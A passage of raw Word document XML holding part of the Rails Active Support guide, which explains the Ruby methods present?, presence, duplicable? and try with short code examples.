                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ArgumentError, 'A key is required...'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2282DB49" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11233BEA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="111A1315" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>present?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is equivalent to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>!blank?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This example is taken from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionDispatch::Http::Cache::Response</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5135"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="59596F2C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="305ABAB6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>set_conditional_cache_control!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23B9A6CB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  return</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>self["Cache-Control"].present?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="244088F3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AD28587" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="570AD0BC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/object/blank.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F6AFC3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>presence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C1A229" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>presence</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns its receiver if </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>present?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> otherwise. It is useful for idioms like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6F15A7A1" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D76BBF7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="2055035576"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>host = config[:host].presence || 'localhost'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2CCCAE78" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/object/blank.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434E097C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>duplicable?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23CEB65C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A few fundamental objects in Ruby are singletons. For example, in the whole life of a program the integer 1 refers always to the same instance:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6000"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5AAF6DB9" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C36B8DE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1.object_id                 # =&gt; 3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A5F077E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Math.cos(0).to_i.object_id  # =&gt; 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="17114334" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Hence, there’s no way these objects can be duplicated through </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>dup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>clone</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="53C6CE82" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0C4BD213" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="54744673"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>true.dup  # =&gt; TypeError: can't dup TrueClass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0CED467E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Some numbers which are not singletons are not duplicable either:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6960"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="62920525" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="05B60D85" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>0.0.clone        # =&gt; allocator undefined for Float</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34314E35" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(2**1024).clone  # =&gt; allocator undefined for Bignum</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="16DC37A2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support provides </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>duplicable?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to programmatically query an object about this property:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3840"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2B982EA8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="194EF781" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"".duplicable?     # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0579C571" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>false.duplicable?  # =&gt; false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0842BC20" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By definition all objects are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>duplicable?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> except </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t>, symbols, numbers, and class and module objects.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0337C9FB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Any class can disallow duplication removing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>dup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>clone</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or raising exceptions from them, only </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rescue</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> can tell whether a given arbitrary object is duplicable. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>duplicable?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> depends on the hard-coded list above, but it is much faster than </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rescue</w:t>
      </w:r>
      <w:r>
        <w:t>. Use it only if you know the hard-coded list is enough in your use case.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E4C580F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/object/duplicable.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21DB01EF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>try</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E5E711" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Sometimes you want to call a method provided the receiver object is not </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, which is something you usually check first. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>try</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Object#send</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> except that it returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if sent to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33DE6EB0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For instance, in this code from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::ConnectionAdapters::AbstractAdapter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@logger</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> could be </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t>, but you save the check and write in an optimistic style:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7560"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7F0D63A6" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="774924E9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>log_info(sql, name, ms)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C19E9B7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@logger.try(:debug?)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1928010D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    name = '%s (%.1fms)'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>% [name || 'SQL', ms]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EBD14F5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @logger.debug(format_log_entry(name, sql.squeeze(' ')))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26D9CE8D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CD5BF02" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3FB4D2C9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>try</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> can also be called without arguments but a block, which will only be executed if the object is not nil:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6168"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0E96ACD6" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1707500C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1298562904"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@person.try { |p| "#{p.first_name} #{p.last_name}"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
